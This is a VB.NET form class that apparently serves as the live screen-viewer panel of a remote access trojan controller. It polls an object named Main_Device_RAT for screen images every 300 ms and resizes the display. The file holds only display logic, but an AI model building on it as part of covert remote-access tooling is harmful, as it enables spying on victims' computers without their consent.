Public Class Remote_Desktop
    Public PWidth As Integer = 500
    Public pHeight As Integer = 500
    Public Rat As New Main_Device_RAT
    Public Sub Refreshme()
        Form1.Connect()
        Dim Memory As IO.MemoryStream = Rat.GetImage
        Dim Width As Integer = PWidth
        Dim Height As Integer = pHeight
        If Width > 1000 Then
            Width = 1000
        ElseIf Width < 500 Then
            Width = 500
        End If
        If Height > 700 Then
            Height = 700
        ElseIf Height < 500 Then
            Height = 500
        End If
        PictureBox1.Size = New Point(Width, Height)
        Dim Surface As New Bitmap(PictureBox1.Size.Width, PictureBox1.Size.Height)
        Dim G As Graphics = Graphics.FromImage(Surface)
        Dim Bmp As Bitmap = New Bitmap(Memory)
        G.DrawImage(Bmp, 0, 0, PictureBox1.Size.Width, PictureBox1.Size.Height)
        PictureBox1.Image = Surface
    End Sub
    Private Sub ComboBox1_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ComboBox1.SelectedIndexChanged
        Try
            PWidth = CInt(ComboBox1.Text)
            Me.Width = PWidth
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    Public Sub LiveStreaming()
        Try
            Refreshme()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub ComboBox2_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ComboBox2.SelectedIndexChanged
        Try
            pHeight = CInt(ComboBox2.Text)
            Me.Height = pHeight
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Try
            If CheckBox1.Checked = True Then
                LiveStreaming()
            Else
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Remote_Desktop_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            Form1.Connect()
            ComboBox1.Text = PWidth
            ComboBox2.Text = pHeight
            Timer1.Interval = 300
            Timer1.Start()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Remote_Desktop_SizeChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.SizeChanged
        Try
            Me.Size = New Point(Val(ComboBox1.Text), Val(ComboBox2.Text))
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
End Class